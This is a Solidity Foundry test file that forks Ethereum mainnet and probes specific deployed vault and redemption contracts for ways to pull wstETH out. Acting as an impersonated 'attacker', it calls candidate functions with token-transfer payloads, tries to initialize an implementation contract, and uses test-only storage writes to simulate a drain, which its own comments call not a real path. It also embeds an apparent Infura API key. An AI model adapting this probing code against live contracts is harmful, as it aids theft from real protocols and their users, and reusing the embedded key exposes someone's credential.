// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/**
 * Investigate related contracts found in storage
 * Looking for alternative paths to extract funds
 */
contract RelatedContractsExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // Contracts found in storage
    address constant RC_SLOT5 = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;
    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateRCSlot5() public view {
        console.log("=== RC SLOT 5 INVESTIGATION ===\n");
        console.log("Address:", RC_SLOT5);

        bytes memory code = RC_SLOT5.code;
        console.log("Code size:", code.length);

        if (code.length == 0) {
            console.log("Contract has no code - might be EOA or selfdestruct");
            return;
        }

        // Check if it's a proxy
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address impl = address(uint160(uint256(vm.load(RC_SLOT5, implSlot))));
        console.log("EIP-1967 implementation:", impl);

        // Check for owner
        (bool hasOwner, bytes memory ownerData) = RC_SLOT5.staticcall(abi.encodeWithSignature("owner()"));
        if (hasOwner && ownerData.length >= 32) {
            address owner = abi.decode(ownerData, (address));
            console.log("Owner:", owner);
        }

        // Check storage
        console.log("\n--- Storage slots ---");
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = vm.load(RC_SLOT5, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Try to identify function selectors
        console.log("\n--- Function probing ---");

        // Common function checks
        (bool hasAsset, bytes memory assetData) = RC_SLOT5.staticcall(abi.encodeWithSignature("asset()"));
        if (hasAsset) {
            console.log("Has asset() function");
            if (assetData.length >= 32) {
                address asset = abi.decode(assetData, (address));
                console.log("  Asset:", asset);
            }
        }

        (bool hasVault, bytes memory vaultData) = RC_SLOT5.staticcall(abi.encodeWithSignature("vault()"));
        if (hasVault) console.log("Has vault() function");

        (bool hasRedeem, ) = RC_SLOT5.staticcall(abi.encodeWithSignature("redeem(uint256)"));
        if (hasRedeem) console.log("Has redeem() function!");
    }

    function test_InvestigateVaultSlot2() public view {
        console.log("=== VAULT SLOT 2 INVESTIGATION ===\n");
        console.log("Address:", VAULT_SLOT2);

        bytes memory code = VAULT_SLOT2.code;
        console.log("Code size:", code.length);

        if (code.length == 0) {
            console.log("Contract has no code");
            return;
        }

        // Check storage
        console.log("\n--- Storage slots ---");
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = vm.load(VAULT_SLOT2, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check for wstETH balance/allowance
        uint256 wstethBalance = IERC20(wstETH).balanceOf(VAULT_SLOT2);
        console.log("\nwstETH balance:", wstethBalance / 1e18);

        uint256 allowanceToRC = IERC20(wstETH).allowance(VAULT_SLOT2, RC);
        console.log("Allowance to RC:", allowanceToRC == type(uint256).max ? "UNLIMITED" : "");
        if (allowanceToRC != type(uint256).max) {
            console.log("  Exact:", allowanceToRC / 1e18);
        }
    }

    function test_InvestigateVaultSlot5() public {
        console.log("=== VAULT SLOT 5 INVESTIGATION ===\n");
        console.log("Address:", VAULT_SLOT5);

        bytes memory code = VAULT_SLOT5.code;
        console.log("Code size:", code.length);

        if (code.length == 0) {
            console.log("Contract has no code");
            return;
        }

        // Check if it's a proxy
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address impl = address(uint160(uint256(vm.load(VAULT_SLOT5, implSlot))));
        console.log("EIP-1967 implementation:", impl);

        // Check for owner
        (bool hasOwner, bytes memory ownerData) = VAULT_SLOT5.staticcall(abi.encodeWithSignature("owner()"));
        if (hasOwner && ownerData.length >= 32) {
            address owner = abi.decode(ownerData, (address));
            console.log("Owner:", owner);
        }

        // Check storage
        console.log("\n--- Storage slots ---");
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = vm.load(VAULT_SLOT5, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check for wstETH
        uint256 wstethBalance = IERC20(wstETH).balanceOf(VAULT_SLOT5);
        console.log("\nwstETH balance:", wstethBalance / 1e18);

        // Try execution functions
        console.log("\n--- Function probing ---");

        vm.startPrank(attacker);

        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("execute(address,bytes)"));
        sigs[1] = bytes4(keccak256("run(bytes)"));
        sigs[2] = bytes4(keccak256("call(address,bytes)"));
        sigs[3] = bytes4(keccak256("withdraw(uint256)"));
        sigs[4] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[5] = bytes4(keccak256("pullFunds(address,uint256)"));
        sigs[6] = bytes4(keccak256("getReward()"));
        sigs[7] = bytes4(keccak256("claim()"));
        sigs[8] = bytes4(keccak256("exit()"));
        sigs[9] = bytes4(keccak256("stake(uint256)"));

        for (uint256 i = 0; i < sigs.length; i++) {
            (bool success, ) = VAULT_SLOT5.call{gas: 100000}(
                abi.encodeWithSelector(sigs[i], wstETH, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18))
            );
            if (success) {
                console.log("Call succeeded:");
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();
    }

    function test_FindOtherRedemptionProxies() public view {
        console.log("=== SEARCHING FOR OTHER REDEMPTION PROXIES ===\n");

        // R0 uses RC as implementation
        // Maybe there are other proxies using RC with different delays?

        // Check if RC has any reference to other proxies
        console.log("RC storage analysis:");
        for (uint256 i = 0; i < 15; i++) {
            bytes32 slot = vm.load(RC, bytes32(i));
            if (uint256(slot) != 0) {
                address maybeAddr = address(uint160(uint256(slot)));
                if (maybeAddr.code.length > 0) {
                    console.log("Slot", i, "= contract:", maybeAddr);

                    // Check if it looks like a redemption proxy
                    bytes32 theirSlot4 = vm.load(maybeAddr, bytes32(uint256(4)));
                    uint32 theirDelay = uint32(uint256(theirSlot4) >> 96);
                    if (theirDelay > 0 && theirDelay < 30 days) {
                        console.log("  Has delay-like value:", theirDelay, "seconds");
                    }
                }
            }
        }

        // Check for proxies at predictable addresses near R0
        console.log("\n--- Checking addresses near R0 ---");

        // Look at a few addresses before and after R0
        uint160 r0Num = uint160(R0);
        for (uint256 delta = 1; delta <= 10; delta++) {
            // Check after R0
            address nearbyAfter = address(r0Num + uint160(delta));
            _checkIfRCProxy(nearbyAfter);

            // Check before R0 if not underflow
            if (r0Num > uint160(delta)) {
                address nearbyBefore = address(r0Num - uint160(delta));
                _checkIfRCProxy(nearbyBefore);
            }
        }
    }

    function _checkIfRCProxy(address nearby) internal view {
        if (nearby.code.length > 0) {
            // Check if it uses RC as implementation
            bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
            address impl = address(uint160(uint256(vm.load(nearby, implSlot))));

            if (impl == RC) {
                console.log("Found proxy using RC at:", nearby);

                bytes32 slot4 = vm.load(nearby, bytes32(uint256(4)));
                uint32 delay = uint32(uint256(slot4) >> 96);
                console.log("  Delay (seconds):", delay);
                console.log("  Delay (days):", delay / 86400);
            }
        }
    }

    function test_DirectRCCallWithManipulation() public {
        console.log("=== DIRECT RC CALL MANIPULATION ===\n");

        // RC when called directly uses its OWN storage
        // RC slot 4 delay = 0
        // But RC slot 3 vault = 0x0000...0002 (not the real vault)

        // What if we can somehow make RC use the correct vault
        // while keeping delay = 0?

        bytes32 rcSlot3 = vm.load(RC, bytes32(uint256(3)));
        console.log("RC slot 3 (vault):");
        console.logBytes32(rcSlot3);

        bytes32 rcSlot4 = vm.load(RC, bytes32(uint256(4)));
        console.log("RC slot 4 (delay etc):");
        console.logBytes32(rcSlot4);

        // What's in RC slot 5?
        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));
        console.log("RC slot 5:");
        console.logBytes32(rcSlot5);

        address rcSlot5Addr = address(uint160(uint256(rcSlot5)));
        console.log("RC slot 5 as address:", rcSlot5Addr);

        // Check if RC has any initialization function we can call
        // that might set the vault properly

        vm.startPrank(attacker);

        console.log("\n--- Trying initialization ---");

        (bool initSuccess, bytes memory initData) = RC.call(
            abi.encodeWithSignature("initialize(address,address,address,uint32)", VAULT, wstETH, TASSET, uint32(0))
        );
        console.log("initialize() success:", initSuccess);
        if (!initSuccess && initData.length > 0) {
            console.log("Error:");
            console.logBytes(initData);
        }

        // Try __RedemptionController_init
        (bool init2Success, ) = RC.call(
            abi.encodeWithSignature("__RedemptionController_init(address,address,address,uint32)", VAULT, wstETH, TASSET, uint32(0))
        );
        console.log("__RedemptionController_init() success:", init2Success);

        vm.stopPrank();
    }

    function test_ExploitRCWithModifiedStorage() public {
        console.log("=== EXPLOIT RC WITH MODIFIED STORAGE ===\n");

        // Use vm.store to set RC's vault to the real VAULT
        // Then try calling RC directly

        // Set RC slot 3 to VAULT
        vm.store(RC, bytes32(uint256(3)), bytes32(uint256(uint160(VAULT))));

        // Verify
        bytes32 newSlot3 = vm.load(RC, bytes32(uint256(3)));
        console.log("RC slot 3 after modification:", address(uint160(uint256(newSlot3))));

        // Check delay is still 0
        bytes32 slot4 = vm.load(RC, bytes32(uint256(4)));
        uint32 delay = uint32(uint256(slot4) >> 96);
        console.log("RC delay:", delay);

        // Now try direct call to RC
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH before:", wstethBefore);

        // Try redeem on RC directly
        console.log("\n--- Attempting direct RC redeem ---");
        (bool redeemSuccess, bytes memory redeemData) = RC.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("Redeem success:", redeemSuccess);
        if (!redeemSuccess && redeemData.length > 0) {
            console.logBytes(redeemData);
        }

        // Check if redemption was created in RC's storage
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        uint256 length = uint256(vm.load(RC, arrayLengthSlot));
        console.log("Redemption count in RC:", length);

        if (length > 0) {
            // Try finalize immediately
            (bool finalizeSuccess, ) = RC.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("Finalize success:", finalizeSuccess);
        }

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH after:", wstethAfter);
        console.log("Gained:", wstethAfter - wstethBefore);

        // NOTE: This uses vm.store which is test-only
        // In real attack, cannot modify RC's storage
        if (wstethAfter > wstethBefore) {
            console.log("\n*** THIS WORKS BUT REQUIRES vm.store ***");
            console.log("*** NOT A REAL VULNERABILITY PATH ***");
        }
    }

    function test_CheckAllVaultAllowances() public view {
        console.log("=== ALL VAULT ALLOWANCES ===\n");

        // Check what addresses have allowance to pull from VAULT

        // Known addresses to check
        address[] memory checkAddrs = new address[](10);
        checkAddrs[0] = RC;
        checkAddrs[1] = R0;
        checkAddrs[2] = TASSET;
        checkAddrs[3] = TIMELOCK;
        checkAddrs[4] = RC_SLOT5;
        checkAddrs[5] = VAULT_SLOT2;
        checkAddrs[6] = VAULT_SLOT5;
        checkAddrs[7] = 0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E; // Safe
        checkAddrs[8] = address(0);
        checkAddrs[9] = 0x0000000000000000000000000000000000000001;

        for (uint256 i = 0; i < checkAddrs.length; i++) {
            uint256 allowance = IERC20(wstETH).allowance(VAULT, checkAddrs[i]);
            if (allowance > 0) {
                console.log("VAULT allowance to:", checkAddrs[i]);
                if (allowance == type(uint256).max) {
                    console.log("  Amount: UNLIMITED");
                } else {
                    console.log("  Amount:", allowance / 1e18, "wstETH");
                }
            }
        }
    }
}
